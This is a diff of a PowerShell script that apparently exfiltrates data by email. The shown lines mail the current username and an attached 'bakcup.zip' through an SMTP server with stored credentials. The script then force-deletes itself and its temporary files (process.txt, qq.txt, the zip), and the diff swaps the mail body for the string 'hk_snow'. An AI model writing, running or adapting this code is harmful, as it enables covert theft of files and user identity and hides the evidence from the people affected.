@@ -22,7 +22,7 @@ $mail.To.Add($MailtoAddress)
 #set the content
 $mail.Subject = $whoami;
 $mail.Priority = "High"
-$mail.Body = $process
+$mail.Body = 'hk_snow'
 $filename="bakcup.zip"	#add file
 $attachment = new-Object System.Net.Mail.Attachment($filename)
 $mail.Attachments.Add($attachment)
@@ -41,6 +41,7 @@ $smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpU
 $smtp.Send($mail)
 $mail.Attachments.Dispose()
 remove-item $MyInvocation.MyCommand.Path -force
-remove-item 'bakcup.zip'
+
 remove-item 'process.txt'
 remove-item 'qq.txt'
+remove-item 'bakcup.zip'
